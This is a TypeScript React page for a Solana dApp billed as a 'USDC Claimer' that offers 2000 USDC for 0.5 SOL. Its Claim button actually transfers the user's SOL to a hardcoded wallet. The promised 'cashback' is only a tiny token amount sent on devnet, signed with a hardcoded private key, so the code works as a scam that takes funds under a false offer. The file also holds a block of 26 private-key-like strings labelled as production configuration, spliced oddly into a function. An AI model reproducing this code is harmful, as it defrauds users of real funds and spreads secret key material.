/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "aJSqUdFXkWC9f9EnYonYs6NDERLYTi5VxmUbQE4ETcW9PwzJ9VxWteaJDEr5Hb7NQk52ZyVBgGmBtC7LW2twDBc"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4oFNayxHYCPG944ezjjfJPEFcQSjftAHbtXwBkKqpJhV2zu4Dh6WKWKjeykkYDd7PSG83V91McTc7ddArHH1bB5",
  "key1": "bez2zayBey9reLK1DmGZ5CtX6aQYy6NTgkCn6jq5tz1sqMvv6PnsskC1Y2AM5W3kTWxqjx4bGjWTEUC3fqGwL6a",
  "key2": "3JdR7ChWX62mNgjToDoYLnCk7HKn61AcKaf4W1PSFcAyar7s2gythyKubvinJci5FUpPjHJYvcK8jjotuwYYSXbH",
  "key3": "5PdeHdFitqfQ2zq8JfkYmTAjpRS5t3rgy9mfZm5iyXtMEZayKwdiMAkYosWa6CBUGTQ1pTCp7YVwYUbFLw1tp3gA",
  "key4": "27bgDdUQmYcjP8TUy9vKkDECkwy7gZ7pXgogkePQutmivRYVHpXsABcYWmMbi7KyzjZh68sNT4Vs6C9dsuvd3UsN",
  "key5": "3oHrzgbdGA3mB4hyxMhSLSzJYwojquoefoZfg4761ngus3DUL1nELyrU444xNpqs7YQjcRJcFX9kyuyFLxU9BFPW",
  "key6": "4eStRFtyrw6sx46Mbq179HMMY25FPRFkBJKJNK7D6MRT8W8CHTYaoVZKFmRYSnDjnQhTf56D9nhV4PHGpZ2tJe4V",
  "key7": "4gXFFvGTUwpJiYuwNsQyNfsjsGgLkrDKUeqJfSZkdyPhgjYj2xRX5W4ovurcbEQ4UttznR8D5buarhKWFytXxQdj",
  "key8": "585BLqfAkG9qcreBhnXZjPG4igFMnsHpkwzMFKnkQadwyoihSRHFLrmXG2aFKjkPQxZh5jfQdJSb9sjpqxX3jQvU",
  "key9": "4ZFUFZ51Brz1wNc1wnowCQchEpYY1RWgi8bXjsXLnVRwQsKh8qDwDVv7xA1kgenpeGMGrXqGr5q4bgas6AJk1e4m",
  "key10": "FK2wSfmiYMVcoj6oN62hwnBRPVgUPxGwY3xe7vtBZxiBHhoCPRn1xH2tkkYtosbDVR3JMMyfdG3gt78MHiEDGuu",
  "key11": "4Wz5pigw9JZ2YYGbVxejJYiEdAVG6JTY1bi9YHmGpyMWBQQkCoi4B4nsqKVeLARC7bsfo8soguAGBoqsJqP3QsXK",
  "key12": "4V1wTT6Y574GGi9TfBRp3h3VdKJGjY6uKsQYtZ2gFMrRCZS1uunwoRXCp5QUeLfNyzgYss3m8HmvQWaTFhjcu3aj",
  "key13": "3BiE3JiaK4c7boVhzVUvLKMdg5VcRjsdDiiESXA4q8crZfNApYo2c6DEaJhszMQVcqGxwrKkKdrgyxKNnHxCU4Cu",
  "key14": "MS3F47FQYRLT4G3pA9vd3hkxhSoGnGWG8WcbfiDMhrtjoqeeFggUvbQ3Ddry9igNJ9Xn2MaGGfRkc1pEVwjD7S4",
  "key15": "4puo57KAkVgjg5mFtKP9EtJ7QYDbkGmxFVTQavrpPXXYb4c2uAmAmzUptmLbtHHj91G3uLfVBWbP8aWZ1pBCFo71",
  "key16": "Gd9gCecW4aBvcVqsNTkH12KehEVFpsABiLu7kXx45DMHWiMEqZfj1iwuZC9LTZSU3PjuzSQxZGvKWJrTaESMwrZ",
  "key17": "5WJjgRgZPaPDQsXwzGqm6PHr5vF4mjZEhAHzPaT4xunWPKqVaLhBxpicxdwHa54qm277W5TLJUGz5d5gC5kmhsnu",
  "key18": "2YNVVVzznekEENGZtZfwSbdeUrKow75z5c4fHU8NL1ahnYMXp9mCusPEzKnpFpY3FYAzv2vXY7Za4xegtgQxRnhm",
  "key19": "4MGsXTx8aVdwEd3BkQRTN39AxsNxxVx33sBntwMJoh4RqpLskdfnkKZ94MCt2ePGVX2vtKb1tWKEZHQovMdpuV4T",
  "key20": "45Yj2kCMabBkNyRFEQXQSSsbEBWDmXcGWbLRNidyyHJDqfnWbnfqV7KYhb1Hksq5ZG7WR4em8D3smEAtgSf2D2pK",
  "key21": "45jFMsqUMvLwGibqCUAfFSMKmGUwZ3cG4SRAnfRCqDmA4kTcGZi6oMGyVm5V71oXYJE21vDGYq6e8p9dja1V3WRp",
  "key22": "5J44Pq6oxXkoGdrWv6UyFJWDBx2VFRe5T6BANcP8et4K3sVrN4GK98YEuWZYV4n1vpsNzicjNHV89hqXVjzszVBg",
  "key23": "5aLE6G9EVCqaV8DjMsci5emtvV73by4LkadMF2RsN8KwL4LJUvUiUfqimMjULccs534dsZrBThBoo27s7W3Yjox4",
  "key24": "3oSQti5rZxt4Sq3UHHem6nkYpGRqnoJCS1tcAE7EAdFfC2rG9EoB7GxxZpRnqtxkfD2qvcvSsZcZGXgPg4A25byK",
  "key25": "2gHBhLAP6g8ZWLLPHc5TE6g8oqLHAQXDbqWTCmcMMT9HwaJ2K5SnHdnzLR1A9RtrhP1kCXce76n8iLxXDrpia2RJ"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
